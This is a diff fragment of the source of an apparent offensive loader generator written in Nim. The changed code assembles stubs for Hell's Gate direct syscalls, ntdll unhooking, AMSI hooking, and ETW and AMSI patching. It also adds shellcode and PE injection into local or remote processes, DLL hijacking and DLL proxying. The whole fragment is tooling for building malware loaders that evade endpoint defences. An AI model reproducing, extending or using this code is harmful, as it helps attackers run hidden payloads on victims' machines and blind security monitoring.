+        stub.add(HellsgateNtOpenProcessDelegate)
+
+if (AMSICreateSectionHook):
+    stub.add(AMSINtCreateSectionHookStubFirst)
+
+stub.add(MainStub)
+
 stub.add(getRandStub())
 
 if(unhook):
     if(hellsgate):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(Winimleanstub)
-        stub.add(WinLeanGetCurrentProcStub)
-        stub.add(HellsgateStub)
-        stub.add(HellsgateProtectDelegate)
-        stub.add(HellsgateWriteDelegate)
-        stub.add(HellsgateNtCloseDelegate)
     elif(getfreshstub):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(Winimleanstub)
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
         stub.add(NtCloseDelegate)
         stub.add(UnhookSyscalls)
     elif(syswhispers):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(Winimleanstub)
     stub.add(UnhookNtdllStub)
 else:
-    if(hellsgate):
-        stub.add(WinLeanGetCurrentProcStub)
-        stub.add(HellsgateStub)
-        stub.add(HellsgateProtectDelegate)
-        stub.add(HellsgateWriteDelegate)
-        stub.add(HellsgateNtCloseDelegate)
-    elif(getfreshstub):
+    if(getfreshstub):
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
 stub.add(getRandStub())
@@ -1563,22 +1620,11 @@ if (remoteETWpatch or remoteAMSIpatch):
     if (unhook == false):
         if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
 stub.add(getRandStub())
-if(dll_out or cpl):
-    if ((hide == false) and (apiHide == false)):
-        stub.add(DLLNoHideStub)
-    stub.add(DllStub)
-    if(dllhijack):
-        stub.add(DLLHijackStub)
-    for f in dllexportfunctions:
-        stub.add(DllCustomExportStub)
-        stub = stub.replace("FUNC_EXPORT", f)
-stub.add(getRandStub())
 if (peload):
     if (localinject):
         if (embeddedArguments):
             stub.add(PatchargsFuncs)
         if (hellsgate):
-            stub.add(HellsgateAllocDelegate)
             stub.add(PELoadStub)
         elif(getfreshstub):
             stub.add(NtAllocateVirtualMemoryDelegate)
@@ -1590,9 +1636,6 @@ if (peload):
     else:   
         stub.add(RemoteProcImportStub)
         if (hellsgate):
-            stub.add(HellsgateNtOpenProcessDelegate)
-            stub.add(HellsgateAllocDelegate)
-            stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
@@ -1626,22 +1669,14 @@ if (shellcode):
             if (localCreateThread):
                 stub.add(NtCreateThreadExDelegate)
             stub.add(LocalInjectDelegates)
-        if (hellsgate):
-            if (localCreateThread):
-                stub.add(HellsgateNtCreateThreadExDelegate)
-            stub.add(HellsgateAllocDelegate)
         stub.add(getRandStub())
         stub.add(LocalInjectStub)
         stub.add(getRandStub())
     else:
-        stub.add(Winimleanstub)
         stub.add(getRandStub())
         if (getfreshstub):
             stub.add(RemoteProcImportStub)
         if (hellsgate):
-            stub.add(HellsgateNtOpenProcessDelegate)
-            stub.add(HellsgateAllocDelegate)
-            stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
@@ -1724,7 +1759,6 @@ if (shellcode):
         stub.add(getRandStub())
 
 if (csharp):
-    stub.add(AssemblyImports)
     stub.add(getRandStub())
     if (noArgs):
         stub.add(LoadAssemblyStub)
@@ -1746,6 +1780,19 @@ if (pump):
 if (sleepycrypt):
     stub.add(LocalInjectGetSyscallStubSleepStub)
     #stub.add(SleepyCryptLoopExecute)
+
+if(dll_out or cpl):
+    if ((hide == false) and (apiHide == false)):
+        stub.add(DLLNoHideStub)
+    if (dllProxy):
+        stub.add(DLLProxyStub)
+    else:
+        stub.add(DllStub)
+        if(dllhijack):
+            stub.add(DLLHijackStub)
+    for f in dllexportfunctions:
+        stub.add(DllCustomExportStub)
+        stub = stub.replace("FUNC_EXPORT", f)
 
 if (debugMode):
     stub = stub.replace("import strenc", "")
@@ -1817,6 +1864,10 @@ elif system.hostOS == "windows":
         basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+
+if (dllProxy or dllClone):
+    basicCompileFlags.add("--mm:orc --threads:on ")
+    basicCompileFlags.add("-d:proxy ")
 
 if(dllProxy):
     when system.hostOS == "windows":
